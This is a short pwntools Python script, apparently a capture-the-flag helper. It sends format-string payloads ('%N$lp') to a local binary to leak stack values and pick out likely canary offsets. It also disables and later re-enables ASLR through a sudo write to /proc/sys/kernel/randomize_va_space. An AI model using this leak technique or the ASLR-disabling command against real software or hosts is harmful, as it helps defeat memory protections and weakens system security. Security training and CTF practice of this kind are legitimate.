from pwn import *
from argparse import ArgumentParser
from os import popen
from re import findall

from variables import colors

parser = ArgumentParser(description="Brute some canaries")

parser.add_argument("-f", dest="file", type=str, help="The file to test")
parser.add_argument("-d", dest="depth", type=int, help="How many format strings should be attempted")

args = parser.parse_args()

# Disable ASLR to ignore libc, set to WARN to prevent flooding of terminal
popen("echo 0 | sudo tee /proc/sys/kernel/randomize_va_space")
context.log_level = 'WARN'

offsets = {}

for _ in range(2):
    for x in range(1, int(args.depth) + 1):
        p = process(f"./{args.file}")
        p.clean(0.2)
        p.sendline(f"%{x}$lp")

        value = findall(r"0x[0-9A-Fa-f]*00", p.recvline().decode("latin-1"))[0]

        if value.endswith("00"):
            if x not in offsets:
                offsets[x] = set()
            offsets[x].add(value)

print("#### Possible Due To Changing Value ####")
for x in offsets:
    if len(offsets[x]) == 2:
        print(colors.GREEN + "[" + colors.RED + "*" + colors.GREEN + "] " + colors.RESET + str(x) + "\t" + ", ".join(offsets[x]))

popen("echo 2 | sudo tee /proc/sys/kernel/randomize_va_space")
